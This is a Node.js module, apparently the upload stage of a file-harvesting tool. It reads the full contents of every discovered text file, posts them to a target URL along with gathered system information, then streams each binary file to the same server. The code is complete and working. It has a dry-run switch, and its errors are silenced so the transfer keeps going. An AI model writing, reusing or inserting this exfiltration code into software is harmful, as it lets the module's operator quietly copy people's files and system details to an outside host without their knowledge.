const http = require('http');
const https = require('https');
const { URL } = require('url');

/**
 * Transmits the gathered data and files to the target server.
 * @param {Object} systemInfo - The system information payload.
 * @param {Array} files - The list of discovered files.
 * @param {string} targetUrl - The destination URL.
 * @param {boolean} isDryRun - Dry-run flag.
 * @param {Object} fileHandler - Reference to the file handler module for reading contents.
 */
async function transmitData(systemInfo, files, targetUrl, isDryRun, fileHandler) {
    if (!targetUrl) {
        console.error(`[ERROR] No target URL provided for transmission.`);
        return;
    }

    if (isDryRun) {
        console.log(`[NETWORK] (Dry-Run) Would transmit payload to: ${targetUrl}`);
        const dummyPayload = {
            systemInfo,
            textFilesCount: files.filter(f => !f.isBinary).length,
            binaryFilesCount: files.filter(f => f.isBinary).length
        };
        console.log(`[NETWORK] (Dry-Run) Payload Summary:\n${JSON.stringify(dummyPayload, null, 2)}`);
        return;
    }

    console.log(`[NETWORK] Preparing data for transmission to ${targetUrl}...`);

    // Process Text Files
    const textFilesData = [];
    for (const file of files) {
        if (!file.isBinary) {
            const content = await fileHandler.readTextFile(file.path);
            if (content !== null) {
                textFilesData.push({
                    name: file.name,
                    path: file.path,
                    content: content
                });
            }
        }
    }

    const jsonPayload = JSON.stringify({
        systemInfo,
        textFiles: textFilesData
    }, null, 2);

    // Send JSON Payload
    await sendJsonPayload(targetUrl, jsonPayload);

    // Stream Binary Files
    for (const file of files) {
        if (file.isBinary) {
            console.log(`[NETWORK] Streaming binary file: ${file.name}`);
            await streamBinaryFile(targetUrl, file.path, fileHandler);
        }
    }
    console.log(`[NETWORK] Transmission complete.`);
}

/**
 * Helper to send JSON via HTTP/HTTPS.
 * @param {string} targetUrl - URL
 * @param {string} payload - JSON string
 */
function sendJsonPayload(targetUrl, payload) {
    return new Promise((resolve, reject) => {
        let parsedUrl;
        try {
            parsedUrl = new URL(targetUrl);
        } catch (e) {
            console.error(`[NETWORK] Invalid target URL: ${targetUrl}`);
            return resolve();
        }

        const requestModule = parsedUrl.protocol === 'https:' ? https : http;

        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload)
            }
        };

        const req = requestModule.request(targetUrl, options, (res) => {
            let data = '';
            res.on('data', chunk => { data += chunk; });
            res.on('end', () => {
                if (res.statusCode >= 200 && res.statusCode < 300) {
                    console.log(`[NETWORK] Successfully sent JSON payload. Server responded: ${res.statusCode}`);
                } else {
                    console.error(`[NETWORK] Failed to send JSON payload. Status Code: ${res.statusCode}`);
                }
                resolve(); // resolve instead of reject to avoid crashing
            });
        });

        req.on('error', (e) => {
            console.error(`[NETWORK] Error sending JSON payload: ${e.message}`);
            resolve();
        });

        req.write(payload);
        req.end();
    });
}

/**
 * Helper to stream binary file via HTTP/HTTPS.
 * @param {string} targetUrl - URL
 * @param {string} filePath - Path to file
 * @param {Object} fileHandler - File handler for getting stream
 */
function streamBinaryFile(targetUrl, filePath, fileHandler) {
    return new Promise((resolve, reject) => {
        let parsedUrl;
        try {
            parsedUrl = new URL(targetUrl);
        } catch (e) {
            console.error(`[NETWORK] Invalid target URL: ${targetUrl}`);
            return resolve();
        }

        const requestModule = parsedUrl.protocol === 'https:' ? https : http;

        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/octet-stream',
                'X-File-Name': filePath.split(/[\/\\]/).pop()
            }
        };

        const req = requestModule.request(targetUrl, options, (res) => {
            res.on('data', () => {}); // Consume data
            res.on('end', () => {
                if (res.statusCode >= 200 && res.statusCode < 300) {
                    console.log(`[NETWORK] Successfully streamed ${filePath}`);
                } else {
                    console.error(`[NETWORK] Failed to stream ${filePath}. Status Code: ${res.statusCode}`);
                }
                resolve();
            });
        });

        req.on('error', (e) => {
            console.error(`[NETWORK] Error streaming file ${filePath}: ${e.message}`);
            resolve();
        });

        const stream = fileHandler.getFileStream(filePath);
        if (stream) {
            stream.pipe(req);
            stream.on('error', (err) => {
                console.error(`[ERROR] Stream error for ${filePath}: ${err.message}`);
                req.end();
                resolve();
            });
        } else {
            req.end();
            resolve();
        }
    });
}

module.exports = {
    transmitData
};
